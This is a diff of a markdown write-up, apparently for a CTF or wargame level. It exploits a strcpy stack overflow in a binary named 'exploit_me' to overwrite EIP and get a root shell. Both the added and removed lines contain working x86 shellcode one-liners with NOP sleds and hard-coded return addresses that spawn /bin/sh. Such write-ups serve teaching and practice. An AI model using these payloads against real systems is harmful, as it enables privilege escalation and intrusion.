@@ -530,52 +530,21 @@ with open("passes.txt", "w+") as my_file:
     0x08048431      mov     eax, 0
     0x08048436      leave
     ```
-    
 
 What’s triggered us a stackoverflow idea is that we have a call of strcpy. So we can copy as many chars we want in the stack!
 
-What we want to know first is the size of the destination. As you can see in the comment, the dest pointer is at main -0x84. 0x84 in dec is 132 but this is not the total length. At 0x080483f4 you can see that there is a backup of ebp that is 4 bytes. So our dest size is 132+4 = 136 bytes.
+EIP saves the address where the program will go after the end of the current function. We will overwrite that and redirect the program execution flow.
 
-Additionnally, there is a memory alignment of 4 bytes at 0x080483f7 so in any case, the length with char before EIP save is 140 bytes.
+In those bytes we will have a shell code that execute a /bin/sh, that give us a root shell.
 
-EIP saves the address where the program will go after the end of the current function. We will overwrite that and redirect the program execution flow. 
-
-In theses bytes we will have a shell code to execute what we want. For the first test, it will be an execve of /bin/sh.
-
-Here is the shellcode : 
-
-[Linux/x86-64 - Execute /bin/sh - 27 bytes](https://shell-storm.org/shellcode/files/shellcode-806.html)
+### Shellcode
 
 ```nasm
 ./exploit_me `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x60\xf6\xff\xbf"'`
 ```
 
-ltrace helps us to find the target address
+### Root !
 
-[https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)
+![Untitled](https://imgur.com/b9sfdUc.png)
 
-[https://www.calculator.net/hex-calculator.html](https://www.calculator.net/hex-calculator.html)
-
-## Solutions
-
-### Ret2libc
-
-[Retour à la libc](https://beta.hackndo.com/retour-a-la-libc/)
-
-### Autonomous shellcode
-
-```nasm
-./exploit_me `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x60\xf6\xff\xbf"'`
-```
-
-### In prev frame shellcode
-
-```nasm
-./exploit_me `python -c "print('1'*140 + '\xc6\xf6\xff\xbf' + '2'*20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"`
-```
-
-### In curr frame light shellcode
-
-```nasm
-./exploit_me $(perl -e 'print "\x90"x39 . "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" . "\x90"x80 . "\x60\xf6\xff\xbf"')
-```
+As you can see here, we are root!
